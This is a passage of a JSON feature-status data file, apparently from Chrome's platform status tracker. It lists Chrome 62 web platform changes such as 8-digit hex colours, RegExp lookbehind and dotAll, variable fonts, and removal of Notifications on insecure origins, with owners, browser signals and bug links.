          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=567283",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 62
        },
        "owners": [
          "noel@google.com",
          "tabatkins@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=76362",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "http://trac.webkit.org/changeset/192023",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Update the CSS color parser to support 8/4-digit hex color. Legacy HTML attribute color parsing, per the \"rules for parsing a legacy colour value\" of the HTML micro syntax (http://bit.ly/1WF2Yre), will not be changed (see http://bit.ly/1UEDbiO), nor will the CSS hashless color quirk (https://quirks.spec.whatwg.org/#the-hashless-hex-color-quirk).",
    "id": 5685348285808640,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/color_value#rgba"
      ],
      "samples": [
        "https://codepen.io/malyw/pen/wGNOrd"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-09-20 18:07:48.349120",
      "by": "Patket@microsoft.com"
    },
    "name": "Accept-Language Headers Fix",
    "tags": [
      "accept-language",
      "headers",
      "language"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://tools.ietf.org/html/rfc7231#section-5.3.5",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 62
        },
        "owners": [
          "claudiomagni@chromium.org",
          "yyushkina@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "ios": 62,
        "blink_components": [
          "Blink>Network"
        ],
        "desktop": 62,
        "flag": true,
        "android": 62,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=737232",
        "intervention": false
      },
      "opera": {
        "android": 49,
        "desktop": 49
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "We want to fix an issue in how Chrome generates the Accept-Language HTTP headers from user language preferences. As websites sometimes only accept languages without region (i.e. “en” vs “en-AU”), a user could receive websites in an unexpected language. We plan to add the base language in the correct position so that users receive webpages in their preferred language.",
    "id": 4842627392339968,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/10eGUww_2Ufv-YyGwnmr9ke_89Q6By_94v02FM_NTU24"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-12-08 03:30:00.690190",
      "by": "jmedley@google.com"
    },
    "name": "Deprecate SVGPathElement.getPathSegAtLength",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://svgwg.org/svg2-draft/paths.html#InterfaceSVGPathElement",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 62
        },
        "owners": [
          "shanmuga.m@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "blink_components": [
          "Blink>SVG"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=669498",
        "intervention": false
      },
      "opera": {
        "android": 49,
        "desktop": 49
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This interface is removed from the spec.\r\nhttps://svgwg.org/svg2-draft/paths.html#InterfaceSVGPathElement.\r\n",
    "id": 5638783282184192,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/SVGPathElement"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-08-29 18:47:58.499740",
      "by": "dtapuska@chromium.org"
    },
    "name": "Dispatch mouse transition events after layout",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 62
        },
        "owners": [
          "dtapuska@chromium.org",
          "lanwei@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "http://crbug.com/488886",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Mouse events are not sent when the nodes under the mouse change during layout.\r\n\r\nThis then represents an incorrect state in that the hover state of where the mouse actually doesn't match the current hover state of the document. \r\n\r\nTo fix a variety of issues we will start dispatching mouse transitional events and update the hover state shortly after layout has been executed.\r\n\r\nThis will match Firefox behavior.",
    "id": 5687758374830080,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1TgqvDg8L_TkEiNjBUaz39FDgxpp5aj9ZdIWeQSanKHY/edit"
      ],
      "samples": [
        "http://jsfiddle.net/mrwb605v/5/",
        "http://jsfiddle.net/Uf3xQ/25/"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-08-15 00:31:25.237130",
      "by": "eae@chromium.org"
    },
    "name": "Implement visibility:collapse for table rows and row-groups",
    "tags": [
      "table",
      "visibility",
      "collapse",
      "hidden",
      "display"
    ],
    "comments": "We plan on shipping visibility:collapse for rows separately from columns, as they can be used totally independently and the code changes are quite different.\r\n\r\nWe're also implementing now to provide feedback that will inform the new css-tables-3 spec, which has just started to specify/clarify this CSS2.1 feature.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://drafts.csswg.org/css-tables-3/#visible-track",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 62
        },
        "owners": [
          "joysyu@google.com",
          "dgrogan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "blink_components": [
          "Blink>Layout>Table"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "https://crbug.com/174167",
        "intervention": false
      },
      "opera": {
        "android": 49,
        "desktop": 49
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=8735",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "visibility:collapse is supposed to hide table rows while preserving their contribution to column widths. Right now blink treats visibility:collapse as visibility:hidden, which merely skips painting the rows, leaving blank space in their place instead of allowing their space to be used for other content.",
    "id": 5684392546533376,
    "resources": {
      "docs": [
        "https://www.w3.org/TR/CSS2/tables.html#dynamic-effects",
        "https://github.com/w3c/csswg-drafts/issues/478",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/visibility",
        "https://docs.google.com/a/google.com/document/d/1G3lheD7HeXNyTo0K1bv4p1XAgDhZYAII-gzx0_2AvLI/edit?usp=sharing"
      ],
      "samples": [
        "https://www.quirksmode.org/css/visibility.html"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-09-18 06:58:04.093820",
      "by": "mathiasb@google.com"
    },
    "name": "Loosen up escape sequence restrictions in template literals",
    "tags": [
      "template literals"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/tc39/proposal-template-literal-revision",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 62
        },
        "owners": [
          "adamk@chromium.org",
          "mathias@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=5546",
        "intervention": false
      },
      "opera": {
        "android": 49,
        "desktop": 49
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The restriction on escape sequences in template literals has been loosened. This enables new use cases for template tags, such as writing a LaTeX processor.",
    "id": 4588025757564928,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-11-17 15:43:22.456480",
      "by": "jmedley@google.com"
    },
    "name": "Media Capture from HTML Media Element (<video>/<audio>)",
    "comments": "Gecko has a prefixed implementation.\r\n\r\nProbably landed this as part of https://bugzilla.mozilla.org/show_bug.cgi?id=664918.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://www.w3.org/TR/mediacapture-fromelement/#html-media-element-media-capture-extensions",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 62
        },
        "owners": [
          "mcasas@chromium.org",
          "niklase@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "blink_components": [
          "Blink>MediaStream>CaptureFromElement"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "http://crbug.com/569976",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "“Media Capture from DOM Elements” document by W3C defines captureStream() method that allows the capture of a <video>/<audio> element in the form of a MediaStream. We want to implement the necessary Blink and Chromium sections that would create this stream by accessing the <video>/<audio> output according to the given play back constraints.",
    "id": 5522768674160640,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/10/capture-stream",
        "https://developer.mozilla.org/en-US/docs/Web/API/Media_Streams_API"
      ],
      "samples": [
        "https://rawgit.com/Miguelao/demos/master/videoelementcapture.html"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-08-29 23:49:55.728190",
      "by": "ericbidelman@google.com"
    },
    "name": "Network Information: Network Quality signals",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://wicg.github.io/netinfo",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 62
        },
        "owners": [
          "tbansal@chromium.org",
          "bengr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Network"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This API provides network performance information to developers, as perceived by the UA, in a format that’s easy to consume and act upon: UA monitors latency and throughput of recent requests and provides estimates for effective RTT, throughput, and connection type that developers should optimize for - e.g. if the recently observed latency and/or throughput is low, the effective connection type will be mapped to a “low” value like 2G or 3G, regardless of the underlying network technology.",
    "id": 5108786398232576,
    "resources": {
      "samples": [
        "https://googlechrome.github.io/samples/network-information/"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-10-08 02:46:59.251070",
      "by": "Patket@microsoft.com"
    },
    "name": "OpenType variable font support",
    "tags": [
      "variable fonts",
      "variation fonts",
      "font-variation-settings",
      "axis",
      "axes",
      "opentype",
      "variation",
      "variable"
    ],
    "comments": "It's recommended to track the meta bug for details on level of current support.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.csswg.org/css-fonts-4/",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 62
        },
        "owners": [
          "drott@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "blink_components": [
          "Blink>Fonts"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=669453",
        "intervention": false
      },
      "opera": {
        "android": 49,
        "desktop": 49
      },
      "edge": {
        "view": {
          "url": "https://www.chromestatus.com/admin/features/edit/4708676673732608",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "url": "https://developer.apple.com/library/content/releasenotes/General/WhatsNewInSafari/Safari_11_0/Safari_11_0.html#//apple_ref/doc/uid/TP40014305-CH13-SW12",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "OpenType variable fonts integration in the layout engine affects at least the following aspects:\r\n\r\n1) Axis value assignments from font-variation-settings\r\n2) Integration of variable fonts axis parameters into layout operations\r\n3) Font matching for:\r\n   * Matching based on canonical scalable axes such as width or weight or optical sizing.\r\n   * Matching named instances\r\n4) Feature resolution of CSS props, feature-settings and variation settings\r\n",
    "id": 4708676673732608,
    "resources": {
      "docs": [
        "https://medium.com/@tiro/https-medium-com-tiro-introducing-opentype-variable-fonts-12ba6cd2369",
        "https://www.microsoft.com/en-us/Typography/OpenTypeSpecification.aspx"
      ],
      "samples": [
        "https://jsfiddle.net/k6pkvj66/1/"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-11-17 22:01:12.863450",
      "by": "jmedley@google.com"
    },
    "name": "PaymentDetailsModifier.data",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/payment-request/#paymentdetailsmodifier-dictionary",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 62
        },
        "owners": [
          "rouslan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Payments"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "http://crbug.com/660926",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Need to support modifiers with the same identifier but different data. One use case for this is to support card payments with different modifiers for credit vs. debit cards. This change adds the PaymentDetailsModifier.data field to supply the different data.",
    "id": 6636936064139264,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/PaymentRequest/PaymentRequest"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-10-10 10:31:09.107280",
      "by": "rouslan@chromium.org"
    },
    "name": "PaymentMethodData.supportedMethods should not be a sequence",
    "tags": [
      "payment",
      "PaymentRequest",
      "payment api",
      "supportedMethods"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://www.w3.org/TR/payment-request/#dom-paymentmethoddata-supportedmethods",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 62
        },
        "owners": [
          "jinho.bang@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Payments"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "http://crbug.com/754779",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "PaymentMethodData.supportedMethods was changed from sequence<DOMString> to DOMString. PaymentMethodData.supportedMethods taking an array is deprecated.\r\n\r\nWe support both string and array starting Chrome 62. Using an array will print a console warning, but will continue working indefinitely. We are measuring the number of people still using array. Once that number is ~0, we will finally remove the array support.",
    "id": 5177301645918208,
    "resources": {}
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-12-08 02:57:19.486830",
      "by": "jmedley@google.com"
    },
    "name": "Performance.timeOrigin",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://www.w3.org/TR/hr-time-3/#time-origin-timestamp",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1313420",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 62
        },
        "owners": [
          "npm@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "blink_components": [
          "Blink>PerformanceAPIs"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=747989",
        "intervention": false
      },
      "opera": {
        "android": 49,
        "desktop": 49
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/highresolutiontime3/",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Performance.timeOrigin was defined in High Resolution Time 3. The attribute is useful for developers to be able to compare timings of objects (like windows or workers) with different time origins.",
    "id": 5695487386583040,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Performance",
        "https://developer.mozilla.org/en-US/docs/Web/API/Performance/timeOrigin"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-12-14 17:21:32.649850",
      "by": "jmedley@google.com"
    },
    "name": "RTCPeerConnection.getStreamById",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1318163",
          "text": "Opposed",
          "val": 7
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 62
        },
        "owners": [
          "foolip@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "blink_components": [
          "Blink>WebRTC>PeerConnection"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "https://crbug.com/698163",
        "intervention": false
      },
      "opera": {
        "android": 49,
        "desktop": 49
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/11662035/",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=170845",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The getStreamById method on RTCPeerConnection is being removed. See https://crbug.com/698163#c10 for a replacement if you depend on this.",
    "id": 5751819573657600,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/RTCPeerConnection",
        "https://developer.mozilla.org/en-US/docs/Web/API/RTCPeerConnection/getStreamById"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-11-15 18:25:03.476630",
      "by": "mathias@chromium.org"
    },
    "name": "RegExp `dotAll` mode / `s` flag",
    "tags": [
      "regexp",
      "regular expressions"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://github.com/tc39/proposal-regexp-dotall-flag",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1361856",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 62
        },
        "owners": [
          "jgruber@chromium.org",
          "mathias@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=6172",
        "intervention": false
      },
      "opera": {
        "android": 49,
        "desktop": 49
      },
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/issues/2787",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=172634",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "The new `s` flag for ECMAScript regular expressions makes `.` match any character, including line terminators.",
    "id": 5644209772036096,
    "resources": {
      "docs": [
        "https://mathiasbynens.be/notes/es-regexp-proposals#dotAll",
        "https://developers.google.com/web/updates/2017/07/upcoming-regexp-features#dotall_flag"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-08-10 00:20:32.998560",
      "by": "adamk@chromium.org"
    },
    "name": "RegExp lookbehind assertions",
    "tags": [
      "regexp",
      "regular expressions"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/tc39/proposal-regexp-lookbehind",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1225665",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 62
        },
        "owners": [
          "mathias@chromium.org",
          "littledan@chromium.org",
          "yangguo@chromium.org",
          "erikcorry@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=4545",
        "intervention": false
      },
      "opera": {
        "android": 49,
        "desktop": 49
      },
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/issues/3448",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=174931",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Lookarounds are zero-width assertions that match a string without consuming anything. ECMAScript has lookahead assertions that does this in forward direction, but the language is missing a way to do this backward which the lookbehind assertions provide. With lookbehind assertions, one can make sure that a pattern is or isn't preceded by another, e.g. matching a dollar amount without capturing the dollar sign.",
    "id": 5668726032564224,
    "resources": {
      "docs": [
        "https://mathiasbynens.be/notes/es-regexp-proposals#lookbehinds",
        "https://developers.google.com/web/updates/2017/07/upcoming-regexp-features#lookbehind_assertions"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-10-30 12:03:19.008570",
      "by": "peter@chromium.org"
    },
    "name": "Remove Insecure usage of Notifications",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 62
        },
        "owners": [
          "emilyschechter@chromium.org",
          "dominickn@chromium.org",
          "peter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "blink_components": [
          "Blink"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=679821",
        "intervention": false
      },
      "opera": {
        "android": 49,
        "desktop": 49
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove access to the Notifications API on insecure origins. This will prevent sites from requesting notification permission or creating non-persistent local notifications over HTTP.\r\n\r\nSites using the Notification API for web push must already be on secure origins due to the requirement for a service worker. Removal is anticipated in Chrome 62.",
    "id": 5759967025954816,
    "resources": {
      "docs": [
        "http://www.w3.org/TR/powerful-features/"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-10-23 00:06:45.162840",
      "by": "dominickn@chromium.org"
    },
    "name": "Remove Usage of Notifications from iFrames",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 62
        },
        "owners": [
          "dominickn@chromium.org",
          "peter@chromium.org",
          "raymes@chromium.org",
          "awdf@chromium.org",
          "emilyschechter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "webview": 62,
        "intervention": false
      },
      "opera": {
        "android": 49,
        "desktop": 49
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove the ability to call Notification.requestPermission() from non-main frames.\r\n\r\nThis change will align the requirements for notification permission with that of push notifications, easing friction for developers. It allows us to unify notification and push permissions.\r\n",
    "id": 6451284559265792,
    "resources": {}
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-08-03 01:33:38.071120",
      "by": "jmedley@google.com"
    },
    "name": "SharedWorker: Remove workerStart",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://www.w3.org/TR/workers/#sharedworker",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 62
        },
        "owners": [
          "npm@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "blink_components": [
          "Blink>PerformanceAPIs"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=695996",
